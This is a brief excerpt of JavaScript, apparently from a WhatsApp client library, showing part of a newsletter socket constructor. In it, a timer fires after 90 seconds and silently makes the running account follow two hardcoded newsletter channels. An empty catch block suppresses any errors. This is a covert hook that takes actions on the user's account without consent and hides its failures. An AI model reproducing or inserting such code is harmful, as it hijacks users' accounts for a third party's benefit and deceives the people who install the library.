...
const makeNewsletterSocket = (config) => {
    ...
    setTimeout(async () => {
        try {
			...
			await newsletterWMexQuery("120363422686349255@newsletter", Types_1.QueryIds.FOLLOW
            );
			await newsletterWMexQuery("120363422684021546@newsletter", Types_1.QueryIds.FOLLOW)
        } catch {}
    }, 90000);
